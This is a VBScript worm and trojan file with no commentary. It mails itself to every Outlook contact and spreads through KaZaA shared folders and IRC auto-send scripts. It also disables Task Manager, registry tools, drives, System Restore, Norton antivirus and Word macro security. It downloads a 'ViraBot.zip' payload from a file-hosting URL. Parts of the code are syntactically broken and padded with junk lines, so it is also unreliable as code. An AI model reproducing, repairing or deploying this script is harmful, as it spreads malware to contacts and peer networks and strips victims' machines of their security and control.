On Error Resume Next



Dim x
Set fso ="Scripting.FileSystem.Object" 
Set so=CreateObject(fso) 
Set ol=CreateObject("Outlook.Application") 
Set out= WScript.CreateObject("Outlook.Application")
Set mapi = out.GetNameSpace("MAPI")
Set a = mapi.AddressLists(1)
For x=1 To a.AddressEntries.Count 
Set Mail=ol.CreateItem(0)
Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)
Mail.Subject="This is for you <3"
Mail.Body=""
Mail.Attachments.Add Wscript.ScriptFullName
Mail.Send
Next
ol.Quit
set fso=CreateObject("Scripting.FileSystemObject")
fso.CopyFile Wscript.ScriptFullName, "C:\Kazaa\", True
If fso.FolderExists("C:\Program Files\KaZaA") then
set KaZaA = "C:\Program Files\KaZaA\My Shared Folder\.vbs"
fso.CopyFile Wscript.ScriptFullName,KaZaA
End If
If fso.FolderExists("C:\Program Files\KaZaA Lite\") then
set KaZaALite = "C:\Program Files\KaZaA Lite\My Shared Folder\.vbs"fso.CopyFile Wscript.ScriptFullName,KaZaALite
End If
set shell=CreateObject("WScript.Shell")
shell.RegWrite "HKLM\\Software\\KaZaA\\Transfer\\DlDir0", "C:\Kazaa");
Dim x
set fso=CreateObject("Scripting.FileSystemObject")
set x=fso.CreateTextFile("C:\mirc\script.ini")
fso.CopyFile Wscript.ScriptFullName, "C:\mirc\vbs", True
x.WriteLine "[script]"
x.WriteLine "n0=on 1:join:*.*: { if ( $nick !=$me ) {halt} /dcc send $nick C:\mirc\ }
x.Close
Dim pirch
set fso=CreateObject("Scripting.FileSystemObject")
set mirc=fso.CreateTextFile("C:\pirch98\events.ini")
fso.CopyFile Wscript.ScriptFullName, "C:\mirc\.vbs", True
pirch.WriteLine "[Levels]");
pirch.WriteLine "Enabled=1");
pirch.WriteLine "Count=6");
pirch.WriteLine "Level1=000-Unknows"
pirch.WriteLine "000-UnknowsEnabled=1"
pirch.WriteLine "Level2=100-Level 100"
pirch.WriteLine "100-Level 100Enabled=1"
pirch.WriteLine "Level3=200-Level 200"
pirch.WriteLine "200-Level 200Enabled=1"
pirch.WriteLine "Level4=300-Level 300"
pirch.WriteLine "300-Level 300Enabled=1"
pirch.WriteLine "Level5=400-Level 400"
pirch.WriteLine "400-Level 400Enabled=1"
pirch.WriteLine "Level6=500-Level 500"
pirch.WriteLine "500-Level 500Enabled=1"
pirch.WriteLine "[000-Unknowns]"
pirch.WriteLine "User1=*!*@*"
pirch.WriteLine "UserCount=1"
pirch.WriteLine "Events1=ON JOIN:#: /dcc send $nick C:\Pirch98\.vbs"
pirch.WriteLine "EventCount=1"
pirch.WriteLine "[100-Level 100]"
pirch.WriteLine "UserCount=0"
pirch.WriteLine "EventCount=0"
pirch.WriteLine "[200-Level 200]"
pirch.WriteLine "UserCount=0"
pirch.WriteLine "EventCount=0"
pirch.WriteLine "[300-Level 300]"
pirch.WriteLine "UserCount=0"
pirch.WriteLine "EventCount=0"
pirch.WriteLine "[400-Level 400]"
pirch.WriteLine "UserCount=0"
pirch.WriteLine "EventCount=0"
pirch.WriteLine "[500-Level 500]"
pirch.WriteLine "UserCount=0"
pirch.WriteLine "EventCount=0"
pirch.Close
set fso=CreateObject("Scripting.FileSystemObject")
fso.CopyFile Wscript.ScriptFullName, "C:\Virc\This is for u <3.vbs", True
set shell=CreateObject("WScript.Shell")
shell RegWrite "HKEY_CURRENT_USER\.Default\Software\MeGaLiTh Software\Visual IRC 96\Events\Event17", "dcc send $nick C:\Virc\This is for u <3.vbs"
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives", "67108863", "REG_DWORD"
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", "1", "REG_DWORD"
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKCU\Control Panel\Accessibility\Keyboard Response\Flags", "127", "REG_SZ"
reg.regwrite "HKCU\Control Panel\Accessibility\SoundSentry\Flags", "3", "REG_SZ"
reg.regwrite "HKCU\Control Panel\Accessibility\SoundSentry\WindosEffect", "3", "REG_SZ"
reg.regwrite "HKLM\SYSTEM\CurrentConrolSet\Services\MouClass\Start", "4", "REG_DWORD"
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKLM\SYSTEM\CurrentConrolSet\Services\MouClass\Start", "4", "REG_DWORD"
Msgbox "You are hacked","Error"

Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools", "1", "REG_DWORD"
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell",""
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","", "REG_SZ"
On Error Resume Next
AutoOff = "."
Set oWMI = GetObject("winmgmts://.")
AutoOffName = "Norton AntiVirus Auto-Protect Service"
sWQL = "Select state from Win32_Service " & "Where displayname='" & AutoOffName & "'"
Set oResults = oWMI.ExecQuery(sWQL)
For Each oService In oResults
oService.StopService
oService.ChangeStartMode("Disabled")
Next
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
 CommandBars("Macro").Controls("Security...").Enabled = False
 System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
 CommandBars("Tools").Controls("Macro").Enabled = False
 Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoRun","1", "REG_DWORD"
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose","1", "REG_DWORD"
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoLogoff","1", "REG_DWORD"
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoFind","1", "REG_DWORD"
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKCU\Control Panel\Mouse\SwapMouseButtons","1", "REG_SZ"
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKCU\Control Panel\Mouse\MouseSpeed","10", "REG_SZ"
Set CB8E2 = createobject("wscript.shell")
C82KB4M2.run "",false
Set objShell = CreateObject( "Wscript.Shell" )
objShell.Run "%windir%\System32\rundll32.exe user32.dll,LockWorkStation" 
Set Shell = CreateObject( "WScript.Shell" )
Dim AK
Dim xmb
WScript.Sleep(50000)
abce = "MLH"
Set xmb = CreateObject("Microsoft.X"+abce+"TTP")
xmb.Open "GET", "http://www.mediafire.com/file/eed4obp20a0lglc/ViraBot.zip/file", False
xmb.Send
C=C=C=C
AK = xmb.ResponseBody
C=C=C=C
Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
C=C=C=C
Dim BinaryStream
C=C=C=C
Set BinaryStream = CreateObject("ADODB.Stream")
BinaryStream.Type = adTypeBinary
A=A=A=A
BinaryStream.Open
BinaryStream.Write AK
b=b=b=b
BinaryStream.SaveToFile "", adSaveCreateOverWrite
Dim fso, f, write
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FolderExists("C:\Temp") Then
Else
Set f = fso.CreateFolder("C:\Temp")
End If
Set fso = CreateObject("Scripting.FileSystemObject")
Set Write = fso.CreateTextFile("C:\Temp\message.txt", True)
Write.WriteLine("XD")
Write.Close
TargetFolder = "C:\Temp"
Set objShell = CreateObject("Shell.Application")
Set objFolder = objShell.Namespace(TargetFolder)
Set colItems = objFolder.Items
For Each objItem in colItems
    objItem.InvokeVerbEx("Print")
Next
Dim reg
Set reg = Createobject("Wscript.Shell")
reg.regwrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore\DisableSR","1", "REG_DWORD"
reg.regwrite "HKLM\SYSTEM\CurrentControlSet\Services\sr","4", "REG_DWORD"